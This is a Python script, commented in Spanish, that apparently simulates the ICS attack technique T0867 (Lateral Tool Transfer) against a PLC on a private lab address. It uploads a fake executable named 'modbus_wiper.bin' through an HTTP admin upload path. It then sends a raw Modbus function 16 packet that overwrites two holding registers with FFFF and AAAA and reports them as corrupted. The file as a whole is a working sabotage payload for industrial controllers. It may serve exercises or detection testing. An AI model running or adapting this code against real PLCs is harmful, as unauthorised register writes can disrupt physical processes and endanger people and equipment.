import socket
import time

IP_PLC = '192.168.70.129'
PORT_WEB = 8081
PORT_ICS = 502

print("[*] Simulando Técnica T0867 - Lateral Tool Transfer")

try:
    # 1. FASE DE TRANSFERENCIA LATERAL (Empujando la herramienta por la red OT)
    print("[-] Fase 1: Transfiriendo herramienta de inyección 'modbus_wiper.bin' al servidor intermedio...")
    s_it = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_it.connect((IP_PLC, PORT_WEB))
    
    # Creamos un HTTP POST subiendo un falso binario ejecutable (Firma MZ)
    # MZ\x90\x00... es el encabezado real de un archivo .exe de Windows/DOS
    post_request = (
        b"POST /admin/upload/modbus_wiper.bin HTTP/1.1\r\n"
        b"Host: 192.168.70.129\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: 16\r\n\r\n"
        b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00"
    )
    s_it.send(post_request)
    s_it.recv(1024)
    s_it.close()
    print("[+] Herramienta transferida con éxito por la red local.")
    time.sleep(1)

    # 2. FASE DE EJECUCIÓN ICS (Sabotaje Múltiple)
    print("[-] Fase 2: Ejecutando herramienta. Sobrescribiendo múltiples registros (FC 16)...")
    s_ot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_ot.connect((IP_PLC, PORT_ICS))
    
    # Modbus FC 16 (0x10) -> Escribir Múltiples Registros (Write Multiple Registers)
    # Vamos a sobrescribir 2 registros seguidos con valores críticos (FFFF y AAAA)
    # Estructura: [TransID][ProtID][Len][UID][FC][StartReg][NumRegs][ByteCount][ Data... ]
    payload_modbus = b'\x00\x01\x00\x00\x00\x0B\x01\x10\x00\x00\x00\x02\x04\xFF\xFF\xAA\xAA'
    s_ot.send(payload_modbus)
    
    respuesta = s_ot.recv(1024)
    print(f"[+] Registros corrompidos. Respuesta del PLC: {respuesta.hex()}")
    s_ot.close()
    print("[*] Ataque T0867 completado.")

except Exception as e:
    print(f"[!] Error: {e}")
